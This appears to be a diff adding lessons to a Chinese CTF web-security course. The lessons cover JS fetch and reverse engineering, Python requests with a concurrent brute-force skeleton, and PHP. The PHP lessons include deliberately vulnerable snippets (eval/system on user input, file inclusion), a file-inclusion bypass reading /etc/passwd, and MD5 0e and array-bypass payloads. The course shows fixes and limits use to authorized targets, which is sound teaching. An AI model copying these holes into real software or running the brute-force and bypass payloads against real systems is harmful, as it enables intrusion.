+<section class="mod" id="m-p3"><h1>PART 4 · 编程：JS / Python / PHP</h1><div class="sub">第 4–7 周 · 8 节</div><blockquote class="note">三把刀按顺序磨：JS（把页面玩明白）→ Python（先能写脚本，CTF 过程中就能用）→ PHP（读源码时才需要）。每节都以「能在靶场上用」为标准。</blockquote><article id="l-p3l1">
+<h2>JS 进阶：fetch、JSON、异步</h2>
+<div class="meta">约 40 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能独立写一段「发请求 → 判结果 → 处理数据 → 显示」的 JS 代码，并看懂别人的实现。</p></div>
+<p>PART 1 学了语法，这节学「怎么真的跟服务器交互」。所有前端逻辑的核心就是这三个动作：<b>发请求、解析响应、处理异常</b>。</p>
+<div class="code"><div class="cbar">async / await 标准写法 · js</div><pre><code>async function loadUser(id) {
+  const res = await fetch("/api/user?id=" + id);
+  if (!res.ok) throw new Error("HTTP " + res.status);   // 4xx/5xx 不会自动抛错
+  const data = await res.json();                        // 解析 JSON 响应体
+  console.log(data.name);
+  return data;
+}
+
+// 调用：用 then/catch 或外层再写 await
+loadUser(1).then(u =&gt; console.log(u)).catch(e =&gt; console.error(e));</code></pre></div>
+<div class="tablewrap"><div class="tcap">fetch 响应对象上常用的字段</div><table><thead><tr><th>成员</th><th>含义</th><th>什么时候用</th></tr></thead><tbody><tr><td>res.ok</td><td>状态码 200–299 时为 true</td><td>判断请求是否成功（比 status 直观）</td></tr><tr><td>res.status</td><td>数字状态码</td><td>要区分 401 / 403 / 404 时</td></tr><tr><td>res.headers.get(x)</td><td>读响应头</td><td>看 Set-Cookie、Content-Type</td></tr><tr><td>res.text()</td><td>响应体当文本</td><td>HTML / 纯文本接口</td></tr><tr><td>res.json()</td><td>响应体当 JSON 解析</td><td>接口返回 JSON 时</td></tr><tr><td>res.blob()</td><td>响应体当二进制</td><td>下载文件</td></tr></tbody></table></div>
+<p>注意一个坑：<b>res.text()、res.json() 都只能调用一次</b>——响应体是流，读一次就消费掉了。要复用就先存起来：<code>const txt = await res.text()</code>。</p>
+<div class="code"><div class="cbar">POST 提交 JSON（最常用） · js</div><pre><code>const res = await fetch("/api/login", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ user: "admin", pw: "123" }),
+});
+console.log(res.status, await res.text());</code></pre></div>
+<div class="code"><div class="cbar">控制台里直接试（最有用的调试方式） · js</div><pre><code>// 控制台支持顶层 await，不用包 async 函数
+const r = await fetch("/api/user?id=1");
+console.log(r.status);
+const j = await r.json();
+console.log(j);
+
+// 想带 Cookie？同源默认带；跨域要 credentials: "include"
+await fetch("https://other.site/api", { credentials: "include" });</code></pre></div>
+<h3>三个最常见的错</h3>
+<ul><li><b>忘记 await</b>：拿到的是 <code>Promise {&lt;pending&gt;}</code>，不是数据。控制台里直接敲 fetch 就会看到这个。</li><li><b>忘了判 res.ok</b>：404 页面也会被当成成功，然后 json() 解析报错。</li><li><b>CORS 被拦</b>：浏览器里跨域请求会先发预检（OPTIONS），对方没放行就失败——这不是你的代码错，是浏览器在保护用户。</li></ul>
+<blockquote class="note">💡 CTF 里这个知识点的用处：<b>看到页面调用了什么接口、传了什么参数，就能自己构造请求重放</b>。前端代码在浏览器里，永远是可读可改可调用的。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch" target="_blank" rel="noopener">MDN · 使用 Fetch</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么 res.json() 只能调用一次？</li><li>JSON.stringify 和 JSON.parse 分别什么时候用？</li><li>await 写在普通函数里会报错，为什么？</li><li>res.ok 和 res.status 的区别是什么？</li><li>控制台里怎么快速验证一个接口的返回？</li></ol>
+</article>
+<article id="l-p3l2">
+<h2>JS 逆向入门：断点、美化、调试</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>拿到一个陌生 JS 文件，能用断点看出它在什么时候、用什么参数、做了什么，并找到加密/校验函数。</p></div>
+<p>「逆向」听起来高级，本质上只有三件事：<b>让代码变好看、让程序停下来、看清变量值</b>。工具全在 F12 里，不用装任何东西。</p>
+<div class="tablewrap"><div class="tcap">Sources 面板的常用操作</div><table><thead><tr><th>操作</th><th>怎么做</th><th>作用</th></tr></thead><tbody><tr><td>格式化压缩代码</td><td>左下角 { } 按钮（Pretty print）</td><td>把一整行变回缩进可读的代码</td></tr><tr><td>打断点</td><td>点行号，出现蓝色标记</td><td>执行到这一行会暂停</td></tr><tr><td>条件断点</td><td>右键行号 → Add conditional breakpoint</td><td>只有条件成立才停，适合循环里抓特定一次</td></tr><tr><td>单步执行</td><td>F10 跳过 / F11 进入 / F8 继续</td><td>逐行观察执行路径</td></tr><tr><td>看变量</td><td>右侧 Scope 面板 / 悬停变量</td><td>当前作用域里所有变量的值</td></tr><tr><td>在暂停时求值</td><td>下方 Console 直接输入表达式</td><td>用当前作用域的变量算东西</td></tr><tr><td>XHR 断点</td><td>Sources → XHR/fetch Breakpoints</td><td>自动停在所有网络请求处</td></tr></tbody></table></div>
+<h3>实战流程：找到登录密码的加密函数</h3>
+<ol class="steps"><li>Network 面板里点一次登录，看请求体：<code>user=admin&amp;pw=8f3a...</code>——pw 是密文。</li><li>在 Sources 里按 <b>Ctrl+Shift+F</b> 全局搜 <code>/login</code> 或 <code>pw</code>，定位发请求的代码。</li><li>在 <code>fetch</code>/<code>XMLHttpRequest</code> 调用那一行<b>前面</b>下一行断点。</li><li>点登录按钮，代码暂停。右侧 Scope 里找到 pw 变量；再往上翻调用栈（Call Stack），找到它是用什么函数算出来的。</li><li>在 Console 里对那个函数求值：改个输入、看输出，确认算法。</li><li>最后：如果算法在本地，你就可以在控制台直接算出任意密码——前端加密在有代码的情况下等于没有加密。</li></ol>
+<div class="code"><div class="cbar">在暂停状态下能做什么 · js</div><pre><code>// 1. 打印当前所有变量
+Object.keys(window);           // 看页面挂了哪些全局对象
+
+// 2. 直接调用可疑函数
+window.encrypt("test");        // 如果它是全局的
+
+// 3. 修改值继续执行
+localStorage.setItem("isAdmin", "true");
+
+// 4. 找挂到 window 上的出口（题目最常留的口子）
+for (const k in window) if (k.startsWith("__")) console.log(k);</code></pre></div>
+<div class="tablewrap"><div class="tcap">常见混淆类型与应对</div><table><thead><tr><th>混淆方式</th><th>特征</th><th>应对</th></tr></thead><tbody><tr><td>压缩（minify）</td><td>一行到底、变量名变短</td><td>点 { } 格式化</td></tr><tr><td>字符串数组</td><td>所有字符串集中在一个数组里，用下标取</td><td>先看数组内容，再看下标对应关系</td></tr><tr><td>十六进制/Unicode 转义</td><td>\x41\u4f60 这类</td><td>复制到控制台 eval 一下看结果</td></tr><tr><td>控制流平坦化</td><td>一堆 while + switch 分发</td><td>找状态机入口，或直接下断点跑</td></tr><tr><td>反调试</td><td>debugger 死循环、检测 devtools</td><td>用条件断点跳过，或右键 Never pause here</td></tr></tbody></table></div>
+<blockquote class="note">💡 逆向的终点不是「看懂每一行」，而是<b>找到那个关键词</b>：加密函数在哪、密钥是什么、校验逻辑能不能绕过。读不懂就调用它——这是本课反复强调的思维。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://developer.chrome.com/docs/devtools/javascript" target="_blank" rel="noopener">Chrome DevTools · JavaScript 调试</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>断点停住时，怎么查看某个变量的值？</li><li>条件断点解决什么问题？</li><li>全局搜索（Ctrl+Shift+F）在逆向里为什么比逐行看更高效？</li><li>看到「一行到底」的代码，第一步做什么？</li><li>如果一段 JS 逻辑看不懂，还有什么绕过办法？</li></ol>
+</article>
+<article id="l-p3l3">
+<h2>Python 环境与第一个脚本</h2>
+<div class="meta">约 35 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>在自己的机器上装好 Python、会建虚拟环境、会跑 .py 文件、会用 pip 装库。</p></div>
+<p>Python 是 Web 选手的「手」：批量请求、编码处理、盲注自动化、日志分析，全靠它。先把它装顺手，后面每一节都会用到。</p>
+<h3>第一步：确认装没装</h3>
+<div class="code"><div class="cbar">Windows 与 Ubuntu 的差别 · bash</div><pre><code># Windows（PowerShell / cmd）
+py --version            # 官方安装器默认带 py 启动器
+python --version        # 装了商店版可能是这个
+where python
+
+# Ubuntu / WSL
+python3 --version
+which python3
+sudo apt install -y python3 python3-pip python3-venv   # 缺什么装什么</code></pre></div>
+<div class="tablewrap"><div class="tcap">虚拟环境：为什么每个项目都要一个</div><table><thead><tr><th>做法</th><th>命令</th><th>好处 / 坏处</th></tr></thead><tbody><tr><td>全局安装</td><td>pip install requests</td><td>简单；但不同项目依赖版本会打架</td></tr><tr><td>venv（推荐）</td><td>python -m venv venv</td><td>项目隔离，删目录即清理</td></tr><tr><td>激活（Windows）</td><td>venv\Scripts\activate</td><td>提示符前面出现 (venv)</td></tr><tr><td>激活（Ubuntu）</td><td>source venv/bin/activate</td><td>同上</td></tr><tr><td>退出</td><td>deactivate</td><td>回到全局环境</td></tr><tr><td>生成依赖清单</td><td>pip freeze > requirements.txt</td><td>换电脑一键 pip install -r requirements.txt</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">第一个脚本：hello.py · python</div><pre><code>import sys
+
+def main():
+    # sys.argv[0] 是脚本名，后面才是参数
+    name = sys.argv[1] if len(sys.argv) &gt; 1 else "world"
+    print(f"hello, {name}")
+
+if __name__ == "__main__":      # 直接运行时才执行
+    main()
+
+# 运行：python hello.py wei        -&gt; hello, wei
+# 运行：python hello.py            -&gt; hello, world</code></pre></div>
+<div class="code"><div class="cbar">装库慢？换国内镜像 · bash</div><pre><code>pip install requests -i https://pypi.tuna.tsinghua.edu.cn/simple
+
+# 永久配置（Windows：%APPDATA%\pip\pip.ini；Ubuntu：~/.pip/pip.conf）
+[global]
+index-url = https://pypi.tuna.tsinghua.edu.cn/simple</code></pre></div>
+<blockquote class="note">💡 新手最容易卡的三件事，一次性说清：<b>①</b> 提示符前面没有 (venv) 说明没激活；<b>②</b> pip 报「不是内部命令」多半是没把 Python 加入 PATH，重装时勾选 “Add Python to PATH”；<b>③</b> Ubuntu 里要用 python3 / pip3。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://docs.python.org/zh-cn/3/tutorial/" target="_blank" rel="noopener">Python 官方教程（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么要用 venv？它解决了什么问题？</li><li>if __name__ == "__main__" 有什么作用？</li><li>f-string 怎么写？举个例子。</li><li>Windows 上装 pip 库慢，怎么办？</li><li>Ubuntu 里 python 命令为什么可能不存在？</li></ol>
+</article>
+<article id="l-p3l4">
+<h2>Python requests：把手工测试写成脚本</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>用 requests 复现你在 Burp 里做过的一次请求，保持会话，并处理超时、重定向、代理。</p></div>
+<p>requests 是 Web 安全脚本的核心库。会用它，等同于「会写自动化」。这一节把它最常用的参数一次性讲透——做题时 90% 的脚本用到的就是这些。</p>
+<div class="tablewrap"><div class="tcap">requests 参数速查</div><table><thead><tr><th>参数</th><th>作用</th><th>典型场景</th></tr></thead><tbody><tr><td>params={...}</td><td>拼到 URL 的查询串</td><td>GET 请求、SQLi 的 ?id=</td></tr><tr><td>data={...}</td><td>表单体（x-www-form-urlencoded）</td><td>登录、POST 表单</td></tr><tr><td>json={...}</td><td>JSON 请求体 + 自动设 Content-Type</td><td>API 接口</td></tr><tr><td>files={...}</td><td>文件上传（multipart）</td><td>上传漏洞</td></tr><tr><td>headers={...}</td><td>自定义请求头</td><td>改 Referer / XFF / UA 绕过</td></tr><tr><td>cookies={...}</td><td>直接塞 Cookie</td><td>已有 session 时最快</td></tr><tr><td>timeout=10</td><td>超时秒数（强烈建议必写）</td><td>防止脚本卡死</td></tr><tr><td>allow_redirects=False</td><td>不自动跟随 302</td><td>看跳转逻辑、SSRF、CSRF</td></tr><tr><td>proxies={...}</td><td>走 Burp 代理</td><td>抓包观察脚本发了什么</td></tr><tr><td>verify=False</td><td>忽略证书错误</td><td>自签名 HTTPS 靶场</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">完整示例：登录 → 访问需要登录的页面 · python</div><pre><code>import requests
+
+BASE = "http://127.0.0.1:8000"
+s = requests.Session()                  # 会话：自动保存并携带 Cookie
+
+# 1. 登录
+r = s.post(BASE + "/login", data={"user": "admin", "pw": "admin"}, timeout=10)
+print("登录状态:", r.status_code, "长度:", len(r.text))
+
+# 2. 访问只有登录后才能看的页面
+r = s.get(BASE + "/profile", timeout=10)
+print(r.status_code, r.text[:200])
+
+# 3. 看会话里到底有什么 Cookie
+print(s.cookies.get_dict())</code></pre></div>
+<div class="code"><div class="cbar">处理重定向、超时与代理 · python</div><pre><code>import requests
+
+# 不跟随重定向：手动看每一步去哪里
+r = requests.get("http://target/redirect", allow_redirects=False, timeout=10)
+print(r.status_code, r.headers.get("Location"))
+
+# 走 Burp 代理，观察脚本的请求
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+r = requests.get("http://target/", proxies=proxies, verify=False, timeout=10)
+
+# 统一异常处理：脚本跑批量时千万别让一个超时打断全部
+try:
+    r = requests.get("http://target/", timeout=5)
+    r.raise_for_status()                 # 4xx/5xx 抛异常
+except requests.RequestException as e:
+    print("请求失败:", e)</code></pre></div>
+<blockquote class="note">💡 从浏览器迁移到脚本的最快路径：Network 面板 → 右键请求 → <b>Copy as cURL</b> → 粘贴到 curlconverter.com → 直接得到 requests 代码。先让它能跑，再理解每一行。</blockquote>
+<h3>常见坑</h3>
+<ul><li><b>忘了 timeout</b>：目标挂掉时脚本会无限等，一晚上白跑。</li><li><b>用 requests.get 却没处理 session</b>：登录后的请求带不上 Cookie，全都跳登录页。</li><li><b>verify=False 的警告</b>：不影响功能，想消掉用 <code>urllib3.disable_warnings()</code>。</li><li><b>编码乱码</b>：<code>r.encoding = r.apparent_encoding</code>，或直接 <code>r.content</code> 自己解码。</li></ul>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://requests.readthedocs.io/" target="_blank" rel="noopener">requests 官方文档</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>requests.Session 解决了什么问题？</li><li>allow_redirects=False 在什么场景下必要？</li><li>为什么脚本测试时常常要走 Burp 代理？</li><li>data 和 json 两个参数的区别是什么？</li><li>批量脚本为什么一定要写 timeout 和 try/except？</li></ol>
+</article>
+<article id="l-p3l5">
+<h2>Python 处理编码与批量验证</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>能写一个带编码处理、并发、重试、结果记录的小工具——这是盲注和爆破的通用骨架。</p></div>
+<p>这一类脚本永远由四部分组成：<b>载荷生成 → 发请求 → 判断结果 → 记录</b>。把这四块写熟，盲注、爆破、目录扫描都是同一个骨架。</p>
+<div class="tablewrap"><div class="tcap">编码三件套（必须背下来）</div><table><thead><tr><th>需求</th><th>代码</th><th>结果</th></tr></thead><tbody><tr><td>Base64 编码</td><td>base64.b64encode(b"hello")</td><td>b'aGVsbG8='</td></tr><tr><td>Base64 解码</td><td>base64.b64decode("aGVsbG8=")</td><td>b'hello'</td></tr><tr><td>URL 编码</td><td>urllib.parse.quote("a b&c")</td><td>'a%20b%26c'</td></tr><tr><td>URL 解码</td><td>urllib.parse.unquote("%e4%bd%a0")</td><td>'你'</td></tr><tr><td>MD5</td><td>hashlib.md5(b"123456").hexdigest()</td><td>32 位十六进制</td></tr><tr><td>十六进制</td><td>binascii.hexlify(b"AB")</td><td>b'4142'</td></tr><tr><td>十六进制还原</td><td>binascii.unhexlify("4142")</td><td>b'AB'</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">编码实验：确认你的直觉 · python</div><pre><code>import base64, urllib.parse, hashlib
+
+s = "flag{w3b}"
+b = base64.b64encode(s.encode())          # 注意：先 encode 成 bytes
+print(b.decode())                         # ZmxhZ3t3M2J9
+
+print(urllib.parse.quote("a=1&amp;b=2"))      # a%3D1%26b%3D2
+print(hashlib.md5(b"123456").hexdigest()) # e10adc3949ba59abbe56e057f20f883e</code></pre></div>
+<div class="code"><div class="cbar">通用爆破骨架（带重试与结果记录） · python</div><pre><code>import requests, time
+from concurrent.futures import ThreadPoolExecutor
+
+TARGET = "http://target/api/check"
+HITS = []
+
+def attempt(item):
+    for _ in range(3):                    # 失败重试 3 次
+        try:
+            r = requests.post(TARGET, data={"key": item}, timeout=5)
+            if r.status_code == 302 or "success" in r.text:
+                HITS.append(item)
+                print("[+] 命中:", item)
+            return
+        except requests.RequestException:
+            time.sleep(0.5)
+
+if __name__ == "__main__":
+    with open("wordlist.txt", encoding="utf-8") as f:
+        items = [x.strip() for x in f if x.strip()]
+    with ThreadPoolExecutor(max_workers=10) as ex:   # 并发别开太大
+        ex.map(attempt, items)
+    with open("hits.txt", "w", encoding="utf-8") as f:  # 结果一定要落盘
+        f.write("\n".join(HITS))
+    print("完成，命中", len(HITS), "个")</code></pre></div>
+<div class="tablewrap"><div class="tcap">怎么判断「命中」</div><table><thead><tr><th>信号</th><th>说明</th><th>可靠性</th></tr></thead><tbody><tr><td>状态码变化</td><td>200 → 302，或 404 → 200</td><td>高</td></tr><tr><td>响应长度变化</td><td>len(r.text) 差几十字节以上</td><td>高</td></tr><tr><td>关键词出现</td><td>"success" / "flag" / "admin"</td><td>中（可能被转义）</td></tr><tr><td>响应时间变化</td><td>sleep 型盲注靠这个</td><td>中（网络抖动大）</td></tr><tr><td>重定向目标</td><td>Location 头指向哪里</td><td>高</td></tr></tbody></table></div>
+<blockquote class="note">💡 这类脚本只用于<b>自己拥有或明确授权</b>的目标（公开靶场、比赛环境、本地容器）。对真实业务系统做批量请求既违规也容易打挂对方——这是安全学习中<strong>最容易越界</strong>的一类操作。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef（在线编解码，验证你的脚本结果）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>Base64 编码前为什么要先 encode 成 bytes？</li><li>为什么并发数不能开太大？</li><li>如果目标没有明显成功字样，还可以比较什么来判断命中？</li><li>为什么脚本里要写 timeout 和重试？</li><li>结果为什么一定要写到文件里？</li></ol>
+</article>
+<article id="l-p3l6">
+<h2>PHP 基础语法与超全局变量</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>读懂一段 PHP 源码，指出用户输入从哪进来、进了哪个函数。</p></div>
+<p>PHP 是 CTF Web 出现频率最高的后端语言。语法松散、上手快，但正是这些「松散」制造了大部分考点。</p>
+<div class="code"><div class="cbar">基础语法：和 JS 的对照 · php</div><pre><code>&lt;?php
+$name = "wei";                 // 变量以 $ 开头，不用声明类型
+$arr  = [1, 2, 3];             // 数组（索引）
+$map  = ["a" =&gt; 1, "b" =&gt; 2];  // 关联数组（像 JS 对象）
+$num  = 42;
+$str  = "值为 $num";           // 双引号里变量会展开
+$raw  = '值为 $num';           // 单引号里不会
+
+function add($x, $y) { return $x + $y; }
+foreach ($map as $k =&gt; $v) { echo "$k = $v"; }
+if ($name === "wei") { echo "yes"; }
+?&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">超全局变量 —— 用户输入的六个入口</div><table><thead><tr><th>变量</th><th>来源</th><th>危险点</th></tr></thead><tbody><tr><td>$_GET</td><td>URL 查询串 ?a=1</td><td>最常见注入点</td></tr><tr><td>$_POST</td><td>请求体（表单/JSON 解析后）</td><td>登录、提交类接口</td></tr><tr><td>$_COOKIE</td><td>Cookie 头</td><td>常被忽略，却能控制会话/序列化数据</td></tr><tr><td>$_FILES</td><td>上传文件</td><td>文件名、临时路径都可控</td></tr><tr><td>$_SERVER</td><td>请求头与路径（如 HTTP_USER_AGENT）</td><td>改 UA / Host 就能注入</td></tr><tr><td>$_REQUEST</td><td>GET + POST + COOKIE 的合集</td><td>来源不明确，最危险</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">危险函数：看到就要警觉 · php</div><pre><code>&lt;?php
+// —— 文件类 ——
+include($_GET["page"]);           // 文件包含：可能执行任意 PHP
+require($_POST["f"]);
+file_get_contents($_GET["f"]);      // 任意文件读取
+readfile($_GET["f"]);
+file_put_contents($_GET["p"], $_POST["d"]);   // 任意文件写入
+
+// —— 执行类 ——
+eval($_POST["code"]);          // 代码执行（最危险）
+assert($_POST["code"]);
+system($_GET["cmd"]);            // 命令执行
+exec(), shell_exec(), passthru(), popen(), `cmd`
+create_function(), preg_replace("/e")
+
+// —— 序列化 ——
+unserialize($_COOKIE["data"]);        // 反序列化：魔术方法触发
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">一个漏洞从产生到修复 · php</div><pre><code>&lt;?php
+// 危险：直接拼接
+$name = $_GET['name'];
+echo "hello, " . $name;                     // XSS：原样输出
+$sql  = "SELECT * FROM u WHERE n='$name'";  // SQLi：拼进 SQL
+
+// 修复
+echo "hello, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
+$stmt = $pdo-&gt;prepare("SELECT * FROM u WHERE n = ?");
+$stmt-&gt;execute([$name]);
+?&gt;</code></pre></div>
+<blockquote class="note">💡 读 PHP 源码的固定路线：<b>找入口</b>（$_GET/$_POST/$_COOKIE）→ <b>跟变量</b> → <b>找它最后进到哪个函数</b>。这条路线上如果没有过滤，就是漏洞。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://www.php.net/manual/zh/" target="_blank" rel="noopener">PHP 官方手册（中文）</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>$_REQUEST 为什么比 $_GET 更危险？</li><li>列出三个能执行系统命令的 PHP 函数。</li><li>文件包含和任意文件读取的区别是什么？</li><li>双引号和单引号字符串的区别？</li><li>用 PDO 写一遍防注入的查询。</li></ol>
+</article>
+<article id="l-p3l7">
+<h2>PHP 弱类型与经典陷阱</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>掌握松散比较、MD5 0e 缺陷、数组绕过、strcmp/switch 陷阱这四类高频考点。</p></div>
+<p>PHP 是弱类型语言，比较时会隐式转换类型。CTF 里最经典的一整类题就是围绕这个特性出的。</p>
+<div class="tablewrap"><div class="tcap">== 与 === 的差别（背这张表）</div><table><thead><tr><th>表达式</th><th>== 结果</th><th>=== 结果</th><th>原因</th></tr></thead><tbody><tr><td>"1" 和 1</td><td>true</td><td>false</td><td>== 会转数字，=== 要求类型也相同</td></tr><tr><td>"1" 和 "1.0"</td><td>true</td><td>false</td><td>两个字符串都转成数字 1</td></tr><tr><td>"0e123" 和 "0e456"</td><td>true</td><td>false</td><td>都解析成 0 的科学计数法</td></tr><tr><td>null 和 false</td><td>true</td><td>false</td><td>松散比较认为空等价</td></tr><tr><td>"abc" 和 0（PHP 7）</td><td>true</td><td>false</td><td>非数字字符串转成 0；PHP 8 已修正</td></tr><tr><td>[] 和 false</td><td>true</td><td>false</td><td>数组与布尔转换</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">MD5 0e 缺陷（经典题） · php</div><pre><code>&lt;?php
+// 题目：要求 md5($a) == md5($b) 但 $a != $b
+// 思路：找两个字符串，它们的 md5 都是 0e 开头（被当成 0 比较）
+$a = "QNKCDZO";              // 0e830400451993494058024219903391
+$b = "240610708";            // 0e462097431906509019562988736854
+// 更多：aaroZmOk、aaK1STfY、aaO8zKZF、byGcY
+
+if ($a != $b &amp;&amp; md5($a) == md5($b)) {
+    echo "flag{...}";
+}
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">数组绕过（更常见，也更通用） · php</div><pre><code>&lt;?php
+// 题目：md5($_GET['a']) === md5($_GET['b'])
+// 请求：?a[]=1&amp;b[]=2
+// md5() 收到数组返回 null，null === null 成立
+// 同类：sha1()、md5_file()、strcmp() 传数组都会返回 null
+
+// strcmp 题：?password[]=x
+// PHP 8 起数组绕过部分被修正，但 == 比较与 json_decode 场景仍可复用
+?&gt;</code></pre></div>
+<div class="code"><div class="cbar">其他高频陷阱 · php</div><pre><code>&lt;?php
+// 1) in_array 松散比较
+in_array("1abc", [1, 2, 3]);     // true（松散）-&gt; 用 in_array($x, $arr, true)
+
+// 2) switch 松散比较
+switch ("1abc") { case 1: echo "命中"; }   // 命中
+
+// 3) intval 的截断
+intval("1e3") == 1;              // 1（不是 1000）
+intval("0x1a") == 0;             // 十进制解析
+
+// 4) 字符串自增
+$s = "a"; $s++;                  // "b" —— 常被用来绕字符过滤
+
+// 5) 变量覆盖
+extract($_GET);                  // 用户能覆盖任意变量！?is_admin=1
+?&gt;</code></pre></div>
+<p><b>PHP 8 的变化</b>：字符串与数字比较的语义被修正（<code>"abc" == 0</code> 变 false），但 md5/sha1 对数组返回 null、0e 比较、<code>in_array</code> 不加 strict、<code>extract</code> 覆盖这些坑依旧存在，仍然是考点。</p>
+<blockquote class="note">💡 这一节的知识在真实开发里同样致命：PHP 项目里任何一处 <code>==</code> 比较用户输入，都可能被 0e 或类型转换绕过。修复原则：<b>比较敏感值一律用 ===，数字先 intval，哈希用 hash_equals</b>。</blockquote>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>为什么 md5 比较题常传 `a[]=1`？</li><li>0e 开头的 md5 为什么能被绕过？</li><li>松散比较 == 和严格比较 === 的区别？</li><li>in_array 不加第三个参数有什么风险？</li><li>extract($_GET) 为什么危险？</li></ol>
+</article>
+<article id="l-p3l8">
+<h2>读 PHP 源码的固定套路</h2>
+<div class="meta">约 45 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>拿到一个 PHP 文件，10 分钟内定位可能的漏洞点，并写出对应的验证 payload。</p></div>
+<p>这节是手法训练。千变万化的代码，用固定四步就能扫出可疑点——这也是真实代码审计的最小流程。</p>
+<div class="tablewrap"><div class="tcap">四步法</div><table><thead><tr><th>步骤</th><th>搜什么</th><th>产出</th></tr></thead><tbody><tr><td>① 找入口</td><td>$_GET / $_POST / $_COOKIE / $_REQUEST / $_FILES / $_SERVER</td><td>所有可控变量清单</td></tr><tr><td>② 跟变量</td><td>变量被赋给了谁、传给了谁</td><td>数据流图（脑内画）</td></tr><tr><td>③ 找落点</td><td>危险函数清单（包含/执行/文件/序列化/SQL）</td><td>可疑调用点</td></tr><tr><td>④ 查判断</td><td>if / === / in_array / preg_match / strpos</td><td>能不能绕过校验</td></tr></tbody></table></div>
+<div class="code"><div class="cbar">一个典型例子（逐步拆） · php</div><pre><code>&lt;?php
+$file = $_GET['f'];                     // ① 入口：完全可控
+if (strpos($file, '..') === false) {    // ④ 判断：只挡了 ..
+    include('./pages/' . $file . '.php');   // ③ 落点：文件包含
+}
+?&gt;
+&lt;!-- 绕过：绝对路径 /etc/passwd 不需要 ..；或者 php://filter 读源码 --&gt;</code></pre></div>
+<div class="tablewrap"><div class="tcap">危险函数速查（按危害排序）</div><table><thead><tr><th>类别</th><th>函数</th><th>能做什么</th></tr></thead><tbody><tr><td>代码执行</td><td>eval / assert / create_function / preg_replace(/e)</td><td>执行任意 PHP 代码</td></tr><tr><td>命令执行</td><td>system / exec / shell_exec / passthru / popen / 反引号</td><td>执行系统命令</td></tr><tr><td>文件包含</td><td>include / require / include_once</td><td>包含并执行任意文件</td></tr><tr><td>文件读写</td><td>file_get_contents / readfile / file_put_contents / unlink / rename</td><td>读写删任意文件</td></tr><tr><td>SQL</td><td>mysql_query / mysqli_query 拼接</td><td>SQL 注入</td></tr><tr><td>反序列化</td><td>unserialize</td><td>触发魔术方法链</td></tr><tr><td>变量覆盖</td><td>extract / parse_str / $$var</td><td>覆盖任意变量</td></tr><tr><td>SSRF/请求</td><td>curl_exec / file_get_contents($url)</td><td>让服务器发请求</td></tr></tbody></table></div>
+<h3>实战练习清单</h3>
+<ol class="steps"><li>拿一个开源 PHP 项目（如一个简单博客），全局搜 <code>$_GET</code>。</li><li>对每一处，往下跟 3 行，看变量进了哪个函数。</li><li>对进到危险函数的，问三件事：能不能控制输入？有没有过滤？过滤能不能绕？</li><li>把怀疑点写成一条 payload，用本地 PHP 内置服务器验证。</li><li>验证成功后再去读修复方式——这样你会记住「为什么这样修」。</li></ol>
+<blockquote class="note">💡 记不住函数没关系，记住这条链：<b>入口 → 变量 → 落点 → 判断</b>。任何一个环节漏了，就是漏洞。</blockquote>
+<h3>靶场与资源</h3><ul class="links"><li><a href="https://owasp.org/www-community/Vulnerabilities/" target="_blank" rel="noopener">OWASP · 常见漏洞说明</a></li></ul>
+<h3>自测 · 答不上就回去重读</h3><ol class="quiz"><li>读源码的四步是哪四步？</li><li>strpos 只挡 `..` 为什么不够？</li><li>如果入口变量被 intval() 处理过，还可能有什么问题？</li><li>列出三个「文件类」危险函数。</li><li>验证一个怀疑点最快的方式是什么？</li></ol>
+</article></section>
+<section class="mod" id="m-p3d"><h1>PART 5 · 自己写一个 Web 应用</h1><div class="sub">第 7–9 周 · 5 节</div><blockquote class="note">不写过一个站，读别人的源码永远是雾里看花。这一 PART 用 Flask 从零写一个带登录、下单、权限判断的小应用，再回头用 Burp 打自己的站——你会发现漏洞都是「开发时偷的懒」。</blockquote><article id="l-p3d1">
+<h2>为什么要自己写一个站</h2>
+<div class="meta">约 25 分钟</div>
+<div class="goal"><b>🎯 本节目标</b><p>理解「开发视角」和「攻击视角」是同一件事的两面，并知道自己要写一个什么样的站。</p></div>
+<p>学长给的建议里有一条特别关键：<b>学语言的时候顺手写一个正经 Web 应用</b>。因为漏洞从来不是凭空出现的，它是开发过程中的某个决定——图省事、少校验、信任前端——带来的副作用。写过一遍，你才知道那些决定发生在哪里。</p>
